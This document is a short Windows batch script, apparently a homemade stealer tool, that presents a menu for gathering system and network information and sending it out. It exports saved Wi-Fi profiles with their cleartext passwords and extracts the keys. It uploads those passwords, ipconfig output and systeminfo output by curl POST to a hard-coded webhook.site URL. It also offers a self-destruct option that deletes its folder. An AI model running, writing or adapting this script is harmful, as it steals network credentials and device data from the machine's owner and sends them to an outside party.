title SP2025
@echo off 

set MainDirectoryPath=C:\\TEST_SP
set DataDirectoryPath=C:\\TEST_SP\data
set WebhookUrl=https://webhook.site/f0ec755f-9fe9-4145-a3f4-d62acb307ce7

:menu
cls
cd %MainDirectoryPath%
if not exist data mkdir data
echo.
echo 1 - open cmd [avilable]
echo 2 - get network info (ipconfig /all) (netstat in the future) [avilable]
echo 3 - get device info (systeminfo) [avilable]
echo 4 - get previous connectrd wi-fi info [avilable]
echo 5 - send to webhook [avilable]
echo 6 - self-destruct
echo.
set /p MenuSelect=">>> "

if %MenuSelect% equ 1 goto :1
if %MenuSelect% equ 2 goto :2
if %MenuSelect% equ 3 goto :3
if %MenuSelect% equ 4 goto :4
if %MenuSelect% equ 5 goto :5
if %MenuSelect% equ 6 goto :6
echo invalid selection
pause >nul
goto :menu

:1
start
goto :menu

:2
cd data
ipconfig /all > network
goto :menu

:3
cd data
systeminfo > system
goto :menu

:4
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > %DataDirectoryPath%\AP
del Wi-* /s /f /q
goto :menu

:5
cd data
curl -X POST -F "file=@network" %WebhookUrl%
curl -X POST -F "file=@system" %WebhookUrl%
curl -X POST -F "file=@AP" %WebhookUrl%
pause
goto :menu

:6
cd ..
rmdir /s /q "%MainDirectoryPath%"
pause
goto :menu
